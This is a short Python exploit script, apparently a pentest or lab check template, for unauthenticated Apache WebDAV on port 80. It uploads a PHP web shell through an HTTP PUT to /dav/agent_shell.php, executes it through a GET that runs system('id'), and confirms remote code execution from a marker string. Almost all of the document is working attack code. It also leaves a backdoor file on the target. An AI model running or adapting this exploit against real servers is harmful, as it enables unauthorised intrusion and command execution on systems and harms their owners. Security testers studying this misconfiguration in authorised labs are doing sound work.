"""
ATTACK NAME: WebDAV Unauthenticated File Upload (RCE)
PORT: 80
MISCONFIGURATION: Apache mod_dav is enabled on the /dav/ directory without authentication.

HOW IT WORKS:
1. WebDAV extends HTTP to allow file management.
2. We send an HTTP PUT request to /dav/backdoor.php containing our malicious PHP code.
3. The server saves the file to the hard drive.
4. We send an HTTP GET request to /dav/backdoor.php to execute the code.

SECURITY IMPACT: Critical. Unauthenticated Remote Code Execution (RCE).
"""

import requests

def validate_evidence(validation_rule, result):
    if result is None: return False
    try:
        if validation_rule.get("type") == "body_contains":
            return validation_rule.get("expected") in str(result)
    except Exception as e:
        print(f"[!] Validation Error: {e}")
    return False

TARGET_IP = "victim"

# The "Template" Data
TEMPLATE = {
    "params": {
        "port": 80,
        "put_path": "/dav/agent_shell.php",
        "payload": "<?php echo \"VULNERABLE_SYSTEM_CONFIRMED\\n\"; system('id'); ?>",
        "timeout": 5
    },
    "validation": {
        "type": "body_contains",
        "expected": "VULNERABLE_SYSTEM_CONFIRMED"
    }
}

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 80 (WebDAV)...")
    raw_response_text = ""
    
    base_url = f"http://{TARGET_IP}:{TEMPLATE['params']['port']}"
    shell_url = f"{base_url}{TEMPLATE['params']['put_path']}"
    
    # --- STEP 1: UPLOAD THE BACKDOOR (HTTP PUT) ---
    try:
        print(f"[*] Sending HTTP PUT request to upload shell at {shell_url}...")
        put_response = requests.put(
            url=shell_url,
            data=TEMPLATE["params"]["payload"],
            timeout=TEMPLATE["params"]["timeout"]
        )
        
        if put_response.status_code not in [200, 201]:
            print(f"[!] Upload failed. Server returned HTTP {put_response.status_code}")
            return
            
        print("[+] Shell uploaded successfully (HTTP 201 Created).")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP PUT Request Failed: {e}")
        return

    # --- STEP 2: EXECUTE THE BACKDOOR (HTTP GET) ---
    try:
        print(f"[*] Sending HTTP GET request to execute shell...")
        get_response = requests.get(
            url=shell_url,
            timeout=TEMPLATE["params"]["timeout"]
        )
        
        raw_response_text = get_response.text
        print(f"[+] HTTP Response Snippet:\n{raw_response_text[:300]}")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP GET Request Failed: {e}")
        return

    # --- STEP 3: VALIDATE ---
    print("[*] Running Validator...")
    is_success = validate_evidence(TEMPLATE["validation"], raw_response_text)
    
    if is_success:
        print("✅ VERDICT: VULNERABILITY CONFIRMED. WebDAV Upload successful.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED. Payload marker not found in response.")

if __name__ == "__main__":
    run_test()